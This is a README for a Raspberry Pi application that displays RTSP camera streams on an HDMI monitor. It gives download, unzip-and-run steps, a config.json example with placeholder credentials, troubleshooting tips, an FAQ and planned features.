# 🎥 raspberry-pi-rtsp-monitor - Simple RTSP Monitoring for Your Raspberry Pi

## 📥 Download Now
[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Kanyanat161/raspberry-pi-rtsp-monitor/releases)

## 🚀 Getting Started
Welcome to the **Raspberry Pi RTSP Monitor**! This application lets you turn your Raspberry Pi into a dedicated RTSP camera monitor. Whether you’re monitoring a security camera or simply observing your pets, this guide will help you set everything up smoothly.

## 📋 Requirements
Before you begin, here’s what you need:

- A Raspberry Pi (any model will work, but the Raspberry Pi Zero W is recommended).
- An HDMI monitor or display.
- An RTSP-compatible camera (like an IP camera).
- A stable internet connection.
- Software: Raspbian OS installed on your Raspberry Pi. If you haven't installed it yet, follow [this link to install Raspbian](https://www.raspberrypi.org/software/).

## 📦 Download & Install
To start using the Raspberry Pi RTSP Monitor, follow these steps:

1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Kanyanat161/raspberry-pi-rtsp-monitor/releases) to find the latest version of the software.

2. **Download the Latest Version:** Look for the latest version available. Click on it to download the `.zip` file containing the application.

3. **Extract the Files:**
   - Open your Raspberry Pi terminal.
   - Navigate to the directory where you downloaded the file. For example:
     ```bash
     cd ~/Downloads
     ```
   - Extract the files using the following command:
     ```bash
     unzip raspberry-pi-rtsp-monitor.zip
     ```

4. **Navigate to the Application Folder:**
   Once extracted, change to the application directory:
   ```bash
   cd raspberry-pi-rtsp-monitor
   ```

5. **Run the Application:**
   To start the application, use the command:
   ```bash
   python3 monitor.py
   ```
   Ensure your RTSP camera is turned on and connected to the same network as your Raspberry Pi.

## ⚙️ Configuration
To configure your RTSP camera, open the `config.json` file located in the application folder. Here’s how you can adjust the settings:

- **RTSP Stream URL:** This is where you input the streaming link of your RTSP camera. For example:
  ```json
  "rtsp_url": "rtsp://username:password@your.camera.ip/stream"
  ```
- **Display Settings:** Adjust settings according to your monitor resolution. 

Save your changes, and then restart the application with the command mentioned in the previous section.

## 🖥️ Monitor Your Camera
When the application runs successfully, you should see the camera feed on your connected monitor. You can resize the display or switch between multiple feeds if you have more than one RTSP camera.

## ❓ Troubleshooting
If you encounter any issues, consider the following:

- **No Camera Feed:** Ensure your RTSP URL is correct and your camera is online.
- **Performance Issues:** Try lowering the resolution of the camera in the settings to achieve smoother video playback.

## 📚 FAQ
**Q: Do I need to setup anything special for the Raspberry Pi?**

A: Yes. Ensure your Raspberry Pi is connected to the internet and has Raspbian OS installed.

**Q: Is this software compatible with all RTSP cameras?**

A: Most RTSP cameras should work, but always check your camera specifications.

**Q: Can I run multiple instances of the software?**

A: You can run multiple instances if you adjust the ports in the configuration file.

## 💬 Community and Support
Join our community if you need assistance or want to share experiences. Check out our [GitHub Discussions](https://github.com/Kanyanat161/raspberry-pi-rtsp-monitor/discussions).

## 📅 Upcoming Features
We plan to add more features like:

- Support for recording video feeds.
- Integration with motion detection.
- Remote monitoring capabilities.

Stay tuned for updates!

## 🏷️ Topics
- CCTV
- CCTV Monitoring
- HDMI
- IP Camera
- Raspberry Pi
- Raspberry Pi Zero W
- RTSP
- RTSP Player
- Security Camera
- Surveillance
- VLC
- VLC Media Player

For any questions or issues, feel free to open an issue on GitHub.

## 📥 Download Now
[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Kanyanat161/raspberry-pi-rtsp-monitor/releases)